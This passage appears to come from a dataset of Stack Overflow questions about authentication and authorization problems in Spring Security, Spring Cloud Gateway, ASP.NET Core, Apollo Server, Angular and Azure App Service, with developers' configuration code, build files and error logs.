            &lt;scope&gt;compile&lt;/scope&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.apache.lucene&lt;/groupId&gt;
            &lt;artifactId&gt;lucene-analyzers-common&lt;/artifactId&gt;
            &lt;version&gt;${lucene-analyzers-common.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.hazelcast&lt;/groupId&gt;
            &lt;artifactId&gt;hazelcast-spring&lt;/artifactId&gt;
            &lt;version&gt;${hazelcast.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
            &lt;artifactId&gt;spring-cloud-commons&lt;/artifactId&gt;
            &lt;version&gt;${spring-cloud-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
            &lt;artifactId&gt;spring-cloud-context&lt;/artifactId&gt;
            &lt;version&gt;${spring-cloud-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;
            &lt;artifactId&gt;spring-cloud-starter-bootstrap&lt;/artifactId&gt;
            &lt;version&gt;${spring-cloud-version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.ibm.icu&lt;/groupId&gt;
            &lt;artifactId&gt;icu4j&lt;/artifactId&gt;
            &lt;version&gt;${icu4j.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.convertapi.client&lt;/groupId&gt;
            &lt;artifactId&gt;convertapi&lt;/artifactId&gt;
            &lt;version&gt;${convertapi.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.itextpdf&lt;/groupId&gt;
            &lt;artifactId&gt;itextpdf&lt;/artifactId&gt;
            &lt;version&gt;${itext.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;net.coobird&lt;/groupId&gt;
            &lt;artifactId&gt;thumbnailator&lt;/artifactId&gt;
            &lt;version&gt;${thumbnailator.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;net.logstash.logback&lt;/groupId&gt;
            &lt;artifactId&gt;logstash-logback-encoder&lt;/artifactId&gt;
            &lt;version&gt;${logback-logstach.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.opencsv&lt;/groupId&gt;
            &lt;artifactId&gt;opencsv&lt;/artifactId&gt;
            &lt;version&gt;${opencsv.version}&lt;/version&gt;
            &lt;exclusions&gt;
                &lt;exclusion&gt;
                    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
                    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
                &lt;/exclusion&gt;
            &lt;/exclusions&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.jsoup&lt;/groupId&gt;
            &lt;artifactId&gt;jsoup&lt;/artifactId&gt;
            &lt;version&gt;${jsoup.version}&lt;/version&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;com.aspose&lt;/groupId&gt;
            &lt;artifactId&gt;aspose-email&lt;/artifactId&gt;
            &lt;version&gt;${aspose.version}&lt;/version&gt;
            &lt;classifier&gt;jdk16&lt;/classifier&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;repositories&gt;
        &lt;repository&gt;
            &lt;id&gt;AsposeJavaAPI&lt;/id&gt;
            &lt;name&gt;Aspose Java API&lt;/name&gt;
            &lt;url&gt;https://repository.aspose.com/repo/&lt;/url&gt;
        &lt;/repository&gt;
    &lt;/repositories&gt;

    &lt;build&gt;
        &lt;sourceDirectory&gt;${project.basedir}/src/main/groovy&lt;/sourceDirectory&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
                &lt;version&gt;${spring-boot-maven-plugin.version}&lt;/version&gt;
                &lt;configuration&gt;
                    &lt;excludes&gt;
                        &lt;exclude&gt;
                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;
                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;
                        &lt;/exclude&gt;
                    &lt;/excludes&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.codehaus.gmavenplus&lt;/groupId&gt;
                &lt;artifactId&gt;gmavenplus-plugin&lt;/artifactId&gt;
                &lt;version&gt;${gmavenplus-maven-plugin.version}&lt;/version&gt;
                &lt;configuration&gt;
                    &lt;parameters&gt;true&lt;/parameters&gt;
                &lt;/configuration&gt;
                &lt;executions&gt;
                    &lt;execution&gt;
                        &lt;goals&gt;
                            &lt;goal&gt;addSources&lt;/goal&gt;
                            &lt;goal&gt;addTestSources&lt;/goal&gt;
                            &lt;goal&gt;generateStubs&lt;/goal&gt;
                            &lt;goal&gt;compile&lt;/goal&gt;
                            &lt;goal&gt;generateTestStubs&lt;/goal&gt;
                            &lt;goal&gt;compileTests&lt;/goal&gt;
                            &lt;goal&gt;removeStubs&lt;/goal&gt;
                            &lt;goal&gt;removeTestStubs&lt;/goal&gt;
                        &lt;/goals&gt;
                    &lt;/execution&gt;
                &lt;/executions&gt;
            &lt;/plugin&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.codehaus.mojo&lt;/groupId&gt;
                &lt;artifactId&gt;versions-maven-plugin&lt;/artifactId&gt;
                &lt;version&gt;${versions-maven-plugin.version}&lt;/version&gt;
                &lt;configuration&gt;
                    &lt;excludes&gt;
                        &lt;exclude&gt;org.apache.commons:commons-collections4&lt;/exclude&gt;
                    &lt;/excludes&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;
                &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;
                &lt;version&gt;${maven-surfire-plugin.version}&lt;/version&gt;
                &lt;configuration&gt;
                    &lt;useFile&gt;false&lt;/useFile&gt;
                    &lt;includes&gt;
                        &lt;include&gt;**/*Test.*&lt;/include&gt;
                    &lt;/includes&gt;
                &lt;/configuration&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;
&lt;/project&gt;
</code></pre>
"
"<p>I am having an issue when adding spring security to spring gateway application. I don't know if it's relevant but I am using spring-boot-starter-parent 2.5.8.</p>
<p>I created the gateway app initially without the spring security to test that the routing was working to another api using it's eureka url. This worked fine. 200 response received with this configuration:</p>
<pre><code>@Configuration
public class RouterConfig {
    @Bean
    public RouteLocator routes(RouteLocatorBuilder builder) {
        return builder.routes()
                .route(&quot;account&quot;, r -&gt; r
                        .path(&quot;/account/**&quot;)
                        .filters(f -&gt; f.stripPrefix(1).prefixPath(&quot;/java-app-account/v1&quot;))
                        .uri(&quot;lb://JAVA-APP-ACCOUNT&quot;)
                        
                    )
                
                .build();
    }
}
</code></pre>
<p>So when I added spring boot security obviously CORS kicks in with a 403 forbidden error so I add the following configurations:</p>
<pre><code>@Configuration
@EnableConfigurationProperties(value = {GlobalCorsProperties.class})
public class SpringSecurityConfig {
     @Bean
      SecurityWebFilterChain springSecurityFilterChain(ServerHttpSecurity http) throws Exception {
        http
                .authorizeExchange()
                .pathMatchers(HttpMethod.OPTIONS,&quot;/account/**&quot;).permitAll()
                 .pathMatchers(HttpMethod.POST,&quot;/account/**&quot;).permitAll()
                 ;
        return http.build();
      }
}
</code></pre>
<p>AND</p>
<pre><code>public class CustomCorsConfiguration {

    @Bean
    public WebFilter corsFilter() {
        return (ServerWebExchange ctx, WebFilterChain chain) -&gt; {
            ServerHttpRequest request = ctx.getRequest();
            if (CorsUtils.isCorsRequest(request)) {
                ServerHttpResponse response = ctx.getResponse();
                HttpHeaders headers = response.getHeaders();
                headers.add(&quot;Access-Control-Allow-Origin&quot;, &quot;http://localhost:4200&quot;);
                headers.add(&quot;Access-Control-Allow-Methods&quot;, &quot;GET, PUT, POST, DELETE, OPTIONS, PATCH&quot;);
                headers.add(&quot;Access-Control-Max-Age&quot;, &quot;7200&quot;); 
                headers.add(&quot;Access-Control-Allow-Headers&quot;,
                        &quot;x-requested-with, authorization, Content-Type, Content-Length, Authorization, credential, X-XSRF-TOKEN&quot;);
                if (request.getMethod() == HttpMethod.OPTIONS) {
                    response.setStatusCode(HttpStatus.OK);
                    return Mono.empty();
                }
            }
            return chain.filter(ctx);
        };
    }
}
</code></pre>
<p>The problem I have is, the preflight OPTIONS request returns the header Access-Control-Allow-Headers but the POST is rejected with Forbidden error with no header in the response.</p>
<p>What have I missed here?</p>
"
"<p>I'm using Spring Boot 3.2.0 with Spring Security. I've changed the way of processing login, <code>formLogin</code> to custom login method. The custom login method works fine, but <code>@AuthenticationPrincipal</code> keeps returning <code>null</code>. When I used <code>formLogin</code> <code>@AuthenticationPrincipal</code> returned the right object. But now <code>@AuthenticationPrincipal</code>, <code>Pricipal</code>, <code> SecurityContextHolder.getContext().getAuthentication().getPrincipal();</code> return <code>null</code>.</p>
<p>I think the login context is not set properly. because when I printed authentication in the <code>login</code> method, it prints authenticated token detail like this:</p>
<pre><code>UsernamePasswordAuthenticationToken [Principal=UserPrincipal(user={user object}, authorities=[user]), Credentials=[PROTECTED], Authenticated=true, Details=null, Granted Authorities=[user]]
and this is what printed in console. 
</code></pre>
<p>but then when I call another API and print authentication in the method, it prints <code>AnonymousAuthenticationToken</code> even though I put <code>JSESSIONID</code> in the request header.</p>
<p>Is there anything I missed? How to set login context properly?</p>
<pre class=""lang-java prettyprint-override""><code>@Configuration
@RequiredArgsConstructor
@EnableWebSecurity
public class SecurityConfig {
    private final UserDetailsService userDetailsService;
    private final AuthenticationConfiguration authenticationConfiguration;

    @Bean
    public AuthenticationManager authenticationManager() throws Exception {
        return authenticationConfiguration.getAuthenticationManager();
    }

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
                .csrf(AbstractHttpConfigurer::disable)
                .cors(withDefaults())
                .formLogin(formLogin -&gt; formLogin.disable())
                .authorizeHttpRequests(request -&gt; request
                        .requestMatchers(&quot;/img/**&quot;, &quot;/login/**&quot;, &quot;*.css&quot;, &quot;/*.js&quot;, &quot;/api/health/**&quot;).permitAll()
                        .anyRequest().authenticated()
                                .requestMatchers(&quot;/api/&quot;)
                )
                .sessionManagement(sessionManagement -&gt; sessionManagement
                        .maximumSessions(1)
                        .maxSessionsPreventsLogin(true)
                )
        ;

        return http.build();
    }
</code></pre>
<pre class=""lang-java prettyprint-override""><code>    @PostMapping(&quot;/login&quot;)
    public UserDetailResponseDto login(LoginRequest loginRequest) {
        User user = userRepository.findByEmail(loginRequest.getEmail()).orElseThrow(() -&gt; new UsernameNotFoundException(loginRequest.getEmail()));
        try {
            Authentication authentication = authenticationManager.authenticate(
                    new UsernamePasswordAuthenticationToken(
                            loginRequest.getEmail(),
                            loginRequest.getPassword()
                    )
            );
            SecurityContextHolder.getContext().setAuthentication(authentication);
        } catch (DisabledException | LockedException | BadCredentialsException e) {
// ...handling error...
        }

        return UserDetailResponseDto.from(user);
    }
</code></pre>
<pre class=""lang-java prettyprint-override""><code>@Data
@AllArgsConstructor
@NoArgsConstructor
public class UserPrincipal implements UserDetails {
    private User user;
    List&lt;GrantedAuthority&gt; authorities;


    public UserPrincipal(User user) {
        List&lt;String&gt; roles = Arrays.stream(user.getRole().split(&quot;, &quot;)).toList();
        List&lt;GrantedAuthority&gt; authorities = roles.stream()
                .map(SimpleGrantedAuthority::new)
                .collect(Collectors.toList());

        this.user = user;
        this.authorities = authorities;
    }

    public static UserPrincipal create(User user) {
        return new UserPrincipal(user);
    }
}
</code></pre>
<pre class=""lang-java prettyprint-override""><code>@RequiredArgsConstructor
@Service
public class UserDetailsServiceImpl implements UserDetailsService, UserService {
    private final UserRepository userRepository;


    @Override
    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
        User user = userRepository.findByEmail(username).orElseThrow(() -&gt; new UsernameNotFoundException(username));
        return UserPrincipal.create(user);
    }
</code></pre>
<pre class=""lang-java prettyprint-override""><code>    @PostMapping(&quot;/set-nickname&quot;)
    @ResponseBody
    public ResponseEntity&lt;?&gt; setNickname(
        @RequestBody UpdateDto update,
        @AuthenticationPrincipal UserPrincipal principal // null!
    ) {

        // .. update user ..
    Authentication authentication 
 = SecurityContextHolder.getContext().getAuthentication();
        System.out.println(authentication); 
// AnonymousAuthenticationToken [Principal=anonymousUser, Credentials=[PROTECTED], Authenticated=true, Details=WebAuthenticationDetails [RemoteIpAddress=0:0:0:0:0:0:0:1, SessionId=null], Granted Authorities=[ROLE_ANONYMOUS]]

        return ResponseEntity.ok().build();
    }
</code></pre>
"
"<p>I am trying to find a way to imperatively authorize resources in an asp.net razor pages application. So far, I have followed the guide found in this link: <a href=""https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased?view=aspnetcore-8.0"" rel=""nofollow noreferrer"">https://learn.microsoft.com/en-us/aspnet/core/security/authorization/resourcebased?view=aspnetcore-8.0</a>. But, I am running into a problem where I want to be able to reuse authentication logic for various different requirements, without having to define a new class which inherits that specific requirement.</p>
<p>For example, I have a location object that I want to be viewable under the following conditions:</p>
<ol>
<li>If the user is of the role Admin or Master, or</li>
<li>If the user is a part of the Zone which the Location is also a part of.</li>
</ol>
<p>I have successfully built a requirement, and two handlers to implement this logic as follows:</p>
<pre><code>public class IsAdminOrHigherHandler : AuthorizationHandler&lt;AccessLocationRequirement&gt;
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        AccessLocationRequirement requirement)
    {
        if (context.User.IsInRole(SD.Roles.Admin.ToString()) || context.User.IsInRole(SD.Roles.Master.ToString()))
        {
            context.Succeed(requirement);
        }
        return Task.CompletedTask;
    }
}

public class InLocationsZoneHandler : AuthorizationHandler&lt;AccessLocationRequirement, Location&gt;
{
    private readonly IUserService _userService;
    public InLocationsZoneHandler(IUserService userService)
    {
        _userService = userService;
    }
    protected override async Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        AccessLocationRequirement requirement,
        Location resource)
    {
        User? user = await _userService.GetUserFromContextAsync();
        if (user == null)
        {
            context.Fail();
            return;
        }
        if (user.Zones.Any(z =&gt; z.Id == resource.Zone.Id))
        {
            context.Succeed(requirement);
            return;
        }
    }
}
</code></pre>
<p>I then register a policy that takes this requirement:</p>
<pre><code>    options.AddPolicy(&quot;CanAccessLocation&quot;,
        policy =&gt; policy.AddRequirements(new AccessLocationRequirement()));
</code></pre>
<p>This works great, but my question is that when I want to define a new policy for defining rules for <strong>editing</strong> a location, I want to avoid rewriting this logic just because the requirement has changed. For example, my condition for editing a location are as follows:</p>
<ol>
<li>If the user is Admin or Master, or</li>
<li>If the user is a part of the Zone which the Location is also a part of AND they have a role of ZoneManager.</li>
</ol>
<p>As we can see, to edit a location, you may fulfill the requirement simply by fulfilling the logic laid out in the <code>IsAdminOrHigherHandler</code> method, but because the <code>IsAdminOrHigherHandler</code> inherits from <code>AuthorizationHandler&lt;AccessLocationRequirement&gt;</code> and not <code>AuthorizationHandler&lt;EditLocationRequirement&gt;</code>, we would have to rewrite this method.</p>
<p>How can I share Authorization Handler logic for different Requirements? Or is there a better method?</p>
"
"<p>I created a very simple reactive (webflux) application with OAuth2 client starter and a <code>provider</code> and <code>registration</code> application properties, but the <code>ReactiveOAuth2AuthorizedClientManager</code> is not auto-configured. Any idea why?</p>
<p>Here is my pom:</p>
<pre class=""lang-xml prettyprint-override""><code>&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
    xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
    &lt;parent&gt;
        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;
        &lt;version&gt;3.2.2&lt;/version&gt;
        &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;
    &lt;/parent&gt;
    &lt;groupId&gt;com.c4-soft.springaddons.sample&lt;/groupId&gt;
    &lt;artifactId&gt;http-exchange-reactive&lt;/artifactId&gt;
    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;
    &lt;description&gt;Resource server with custom authentication manager&lt;/description&gt;
    &lt;properties&gt;
        &lt;java.version&gt;21&lt;/java.version&gt;
    &lt;/properties&gt;
    &lt;dependencies&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-oauth2-client&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-oauth2-resource-server&lt;/artifactId&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-webflux&lt;/artifactId&gt;
        &lt;/dependency&gt;

        &lt;dependency&gt;
            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
        &lt;dependency&gt;
            &lt;groupId&gt;io.projectreactor&lt;/groupId&gt;
            &lt;artifactId&gt;reactor-test&lt;/artifactId&gt;
            &lt;scope&gt;test&lt;/scope&gt;
        &lt;/dependency&gt;
    &lt;/dependencies&gt;

    &lt;build&gt;
        &lt;plugins&gt;
            &lt;plugin&gt;
                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;
                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;
            &lt;/plugin&gt;
        &lt;/plugins&gt;
    &lt;/build&gt;

&lt;/project&gt;
</code></pre>
<p>Application properties:</p>
<pre class=""lang-yaml prettyprint-override""><code>keycloak-base-uri: https://localhost:8443/auth
issuer: ${keycloak-base-uri}/realms/master
keycloak-admin-api-consumer-secret: change-me

spring:
  security:
    oauth2:
      client:
        provider:
          keycloak:
           issuer-uri: ${issuer}
        registration:
          backend-with-client-credentials:
            provider: keycloak
            authorization-grant-type: client_credentials
            client-id: keycloak-admin-api-consumer
            client-secret: ${keycloak-admin-api-consumer-secret}
            scope: openid
</code></pre>
<p>And most simple reproducer:</p>
<pre class=""lang-java prettyprint-override""><code>@SpringBootApplication
public class HttpClientReactiveApplication {

    public static void main(String[] args) {
        SpringApplication.run(HttpClientReactiveApplication.class, args);
    }

    @Bean
    Converter&lt;String, String&gt; failToInject(ReactiveOAuth2AuthorizedClientManager authorizedClientManager) {
        return source -&gt; source;
    }

}
</code></pre>
<p>When I try to start the app, I get:</p>
<pre><code>2024-02-19T15:01:51.575-10:00[0;39m [32m INFO[0;39m [35m21168[0;39m [2m---[0;39m [2m[           main][0;39m [2m[0;39m[36mc.c.o.HttpClientReactiveApplication     [0;39m [2m:[0;39m Starting HttpClientReactiveApplication using Java 21 with PID 21168 (D:\workspaces\libs\http-client-reactive\target\classes started by ch4mp in D:\workspaces\libs\http-client-reactive)
[2m2024-02-19T15:01:51.577-10:00[0;39m [32m INFO[0;39m [35m21168[0;39m [2m---[0;39m [2m[           main][0;39m [2m[0;39m[36mc.c.o.HttpClientReactiveApplication     [0;39m [2m:[0;39m No active profile set, falling back to 1 default profile: &quot;default&quot;
[2m2024-02-19T15:01:52.949-10:00[0;39m [33m WARN[0;39m [35m21168[0;39m [2m---[0;39m [2m[           main][0;39m [2m[0;39m[36monfigReactiveWebServerApplicationContext[0;39m [2m:[0;39m Exception encountered during context initialization - cancelling refresh attempt: org.springframework.beans.factory.UnsatisfiedDependencyException: Error creating bean with name 'failToInject' defined in com.c4soft.openfeign.HttpClientReactiveApplication: Unsatisfied dependency expressed through method 'failToInject' parameter 0: No qualifying bean of type 'org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientManager' available: expected at least 1 bean which qualifies as autowire candidate. Dependency annotations: {}
[2m2024-02-19T15:01:52.966-10:00[0;39m [32m INFO[0;39m [35m21168[0;39m [2m---[0;39m [2m[           main][0;39m [2m[0;39m[36m.s.b.a.l.ConditionEvaluationReportLogger[0;39m [2m:[0;39m 

Error starting ApplicationContext. To display the condition evaluation report re-run your application with 'debug' enabled.
[2m2024-02-19T15:01:52.995-10:00[0;39m [31mERROR[0;39m [35m21168[0;39m [2m---[0;39m [2m[           main][0;39m [2m[0;39m[36mo.s.b.d.LoggingFailureAnalysisReporter  [0;39m [2m:[0;39m 

***************************
APPLICATION FAILED TO START
***************************

Description:

Parameter 0 of method failToInject in com.c4soft.openfeign.HttpClientReactiveApplication required a bean of type 'org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientManager' that could not be found.


Action:

Consider defining a bean of type 'org.springframework.security.oauth2.client.ReactiveOAuth2AuthorizedClientManager' in your configuration.
</code></pre>
<p>Any idea why the <code>ReactiveOAuth2AuthorizedClientManager</code> is not auto-configured?</p>
"
"<p>I am in the process of upgrading to Spring 6 and Spring Security 6 but I am not able to get to my login page. Depending on how I set it up, I either get a 403, or redirected to the login page from the login page creating an infinite loop.</p>
<p>I have modified my Security Config to use <code>SecurityFilterChain</code> and converted my paths to Mvc paths instead of Ant paths.</p>
<p>What's strange is I am able to reach the <code>/session</code> endpoint successfully, and when I debug I do get to my login controller's method, it executes normally and returns a <code>ModelAndView</code>, but in the browser I don't get access to the page. If I change the method to return a raw JSON object, I get the object successfully, but obviously I'd like to get my functional page.</p>
<p>A complicating factor is that I have several <code>SecurityFilterChain</code> for various authentication mechanisms, but their pages don't overlap with this one, so I don't believe them to be the issue. Especially because when I make changes to this one, it does successfully change the behaviour of the page (redirect loop to 403)</p>
<p>Are there any changes in Spring 6 or Spring behaviours that would cause a 403 during the process of handling a <code>ModelAndView</code>?</p>
<p><strong>SecurityConfig.java</strong></p>
<pre><code>
public static final String[] LOGIN_PAGES = {&quot;/LoginPage&quot;, &quot;/ValidateLogin&quot;, &quot;/session&quot; };

@Bean(&quot;defaultSecurityChain&quot;)
@Order(Ordered.LOWEST_PRECEDENCE)
public SecurityFilterChain defaultSecurityChain(HttpSecurity http, HandlerMappingIntrospector introspector) throws Exception {
  RequestMatcher[] matchers = Arrays.asList(LOGIN_PAGES).stream().map(
    e -&gt; (new MvcRequestMatcher.Builder(introspector)).pattern(e))
      .collect(Collectors.toList()).toArray(new RequestMatcher[0]);
  http.authorizeHttpRequests(authorize -&gt; authorize.requestMatchers(matchers)
    .permitAll())
    // if form login and logout are commented out, I get a 403
    // if they are here, I get a loop to the login page until I get a too many redirects
    .formLogin(login -&gt; login.loginPage(&quot;/LoginPage&quot;)
      .permitAll().loginProcessingUrl(&quot;/ValidateLogin&quot;)
      .usernameParameter(&quot;loginName&quot;).passwordParameter(&quot;password&quot;)
      .failureHandler(customAuthenticationFailureHandler())
      .successHandler(customAuthenticationSuccessHandler()))
    .logout(logout -&gt; logout.logoutUrl(&quot;/Logout&quot;).logoutSuccessUrl(&quot;/LoginPage&quot;)
      .invalidateHttpSession(true))
    .sessionManagement(sessionManagement -&gt; sessionManagement.invalidSessionUrl(&quot;/LoginPage&quot;)
      .sessionFixation().migrateSession())
    .csrf(csrf -&gt; csrf.ignoringRequestMatchers(&quot;/ValidateLogin&quot;))
    .headers(headers -&gt; headers.frameOptions(frameOptions -&gt; frameOptions.sameOrigin()
      .contentSecurityPolicy(csp -&gt; csp.policyDirectives(CONTENT_SECURITY_POLICY))));
</code></pre>
<p><strong>LoginController.java</strong></p>
<pre><code>@RequestMapping(value = &quot;/LoginPage&quot;, method = RequestMethod.GET)
public ModelAndView showLoginPage(HttpServletRequest request, Principal principal) {
  if (principal != null) {
    return new ModelAndView(findForward(HOME_PAGE));
  }

  String forward = FWD_SUCCESS;
  LoginForm form = new LoginForm();
  return new ModelAndView(pageBuilderService.setupJSPPage(realForward, request), &quot;form&quot;, form);
}

@GetMapping(value = &quot;/session&quot;, produces = MediaType.APPLICATION_JSON_VALUE)
@ResponseBody
public UserSession getSesssionDetails(HttpServletRequest request, CsrfToken token) {
  boolean authenticated = !userModuleService.isSessionExpired(request);
  UserSession session = new UserSession();
  /* setting up user session info...*/
  return session;
}
</code></pre>
"
"<p>I know that the safe approach to work with auth tokens is to use Http-Only, because with that, the JWT token will be read and set only on the server side. Ok, that makes sense to me.</p>
<p>My problem is: How can I apply logic to allow users access to some routes only when they are logged in successfully? Currently, I'm storing the auth token in session storage and using Angular auth guards to validate if the auth token is valid. But how would I validate the auth token in the Angular auth guards if the auth token is not readable on the client side?</p>
"
"<p>I'd like to seek assistance on how to implement authorization in the Apollo server to restrict immediate access to the payload result. I've searched on Google and other dev forums, but I couldn't find anything. Thank you.</p>
<pre><code>import { ApolloServer } from &quot;@apollo/server&quot;;
 import { expressMiddleware } from &quot;@apollo/server/express4&quot;;

const server = new ApolloServer({
    typeDefs,
    resolvers,
    introspection: true,
    csrfPrevention: true,
    cache: &quot;bounded&quot;,
    async onHealthCheck() {
        try {
          const healthInfo = {
            uptime: process.uptime(),
            memoryUsage: process.memoryUsage(),
            cpuUsage: process.cpuUsage(),
            nodeVersion: process.version,
            timestamp: new Date()
          };
          return healthInfo;
        } catch (error) {
          throw new Error('An error occurred while getting health info');
        }
      },
    plugins: [
        ApolloServerPluginDrainHttpServer({ httpServer }),
        config.NODE_ENV === &quot;PROD&quot;
            ? ApolloServerPluginLandingPageDisabled()
            : config.NODE_ENV === &quot;STAGE&quot;
            ? ApolloServerPluginLandingPageProductionDefault({
                    graphRef: &quot;my-graph-id@my-graph-variant&quot;,
                    footer: false,
              })
            : ApolloServerPluginLandingPageLocalDefault({ footer: false },   {embed : true}),
        // ApolloServerPluginInlineTrace({
        //     includeErrors: { transform: (err) =&gt; (err.message.match(SENSITIVE_REGEX) ? null : err) },
        // }),
    ],

});

const corsOptions = {
    origin: &quot;*&quot;,
    credentials: true,
    optionSuccessStatus: 200,
};


const conditionalJwtCheck = async (req, res, next) =&gt; {
    if (config.ENABLE_API_SECURITY) {
        jwtCheck(req, res, next);       
    } else {
        next();
    }
};

app.use(cors(corsOptions));
app.use(graphqlUploadExpress());
app.use(
    &quot;/graphql&quot;,
    //cors(corsOptions),
    json({ limit: config.PAYLOAD_LIMIT }), // Adjust limit based on your requirements
    express.json({ limit: config.PAYLOAD_LIMIT }), // Adjust limit based on your requirements
    speedLimiter,
    express.urlencoded({ extended: true }),
    conditionalJwtCheck,
    expressMiddleware(server, {
        context: async ({ req , res }) =&gt; {
            try {
            const token = req.headers.authorization || &quot;&quot;;
            await auditProcessor.auditLogInput(req, res);
            
            return { token };
        } catch (error) {
            console.error('An error occurred:', error);
        }
        },
    })
);
</code></pre>
<p>I'd like to set a header for authorization first before accessing the mutations or queries.</p>
"
"<p>I am working on implementing authentication and authorization in my ASP.NET Core application, but I'm encountering an error that I'm unable to resolve. I have a class <code>AppDbContext</code> that inherits from <code>IdentityDbContext&lt;ApplicationUser&gt;</code> to handle user-related data. Here is the code:
I have CS0311 Error on AppDbContext</p>
<pre class=""lang-cs prettyprint-override""><code>using AuthenNAuthorizationRoles.Models;
using Microsoft.AspNetCore.Identity.EntityFrameworkCore;
using Microsoft.EntityFrameworkCore;

namespace AuthenNAuthorizationRoles.Services
{
    public class **AppDbContext **: IdentityDbContext&lt;ApplicationUser&gt;
    {
        public AppDbContext(DbContextOptions&lt;AppDbContext&gt; options) : base(options)
        {
            
        }
    }
}


I have ensured that all necessary packages are installed and that my Program.cs file is correctly configured for authentication and authorization.

Error : https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-messages/cs0311?f1url=%3FappId%3Droslyn%26k%3Dk(CS0311)

Can anyone help me understand what might be causing this error and how to resolve it? Any insights or suggestions would be greatly appreciated. Thank you!
</code></pre>
"
"<p>I have set up authentication for my app service and I am trying to call my web job using the webhook url. I want to pass the OAuth token rather than basic auth. Is there any way to do this?</p>
<p>I have tried sending the token in the web hook call in postman but it gives me 403 forbidden error.</p>
"
"<p>I am struggling to understand how role based authorization is working in Azure app services.
It works for the user, but not service principals (app registrations).
My setp:</p>
<ol>
<li>I create app roles for app registration:
<a href=""https://i.stack.imgur.com/lytO7.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lytO7.png"" alt=""App roles"" /></a>
<a href=""https://i.stack.imgur.com/4l9Gj.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/4l9Gj.png"" alt=""Role creation"" /></a></li>
<li>I assign users and principals to some roles:
<a href=""https://i.stack.imgur.com/6qhzy.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/6qhzy.png"" alt=""App role assignment"" /></a></li>
<li>I assign this app registration to some app service with Microsoft as provider
<a href=""https://i.stack.imgur.com/ICLFJ.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ICLFJ.png"" alt=""App service assignment"" /></a></li>
</ol>
<p>In my code I have the following setup:</p>
<ol>
<li>Install package <code>Microsoft.Indeitity.Web</code> (2.17 version, currently latest)</li>
<li>Program.cs:</li>
</ol>
<pre><code>// Makes the roles come in 'role' claim
System.IdentityModel.Tokens.Jwt.JwtSecurityTokenHandler.DefaultMapInboundClaims = false;

